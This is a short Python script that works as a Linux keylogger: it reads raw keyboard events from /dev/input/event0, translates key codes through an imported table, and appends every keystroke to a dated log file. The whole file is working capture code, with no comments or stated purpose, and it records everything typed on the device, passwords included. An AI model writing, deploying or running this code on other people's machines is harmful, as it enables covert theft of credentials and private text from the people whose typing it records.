import struct
from key_codes import code as key_code
from datetime import date

DEVICE = "/dev/input/event0"
FORMAT = 'llHHI'
EVENT_SIZE = struct.calcsize(FORMAT)
keys = []

def format_key_for_logging(key):
    if key == '[RETURN]':
        key = key + '\n'
    elif key[0] == '[':
        key = ' ' + key + ' '
    return key

def write_to_file(keys):
    filename = str(date.today()) + "-KeyboardActivityLogs.txt"
    with open(filename, "a") as file:
        for key in keys:
            loggable_key = format_key_for_logging(key)
            file.write(loggable_key)

def read_data():
    with open(DEVICE, "rb") as file:
        data = file.read(EVENT_SIZE)
        while data:
            (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, data)
            if type != 0 or code != 0 or value != 0:
                if code != 4 and value == 0:
                    key = key_code[str(code)]
                    keys.append(key)
                    if len(keys) > 3:
                        write_to_file(keys)
                        keys.clear()
            data = file.read(EVENT_SIZE)

if __name__ == "__main__":
    read_data()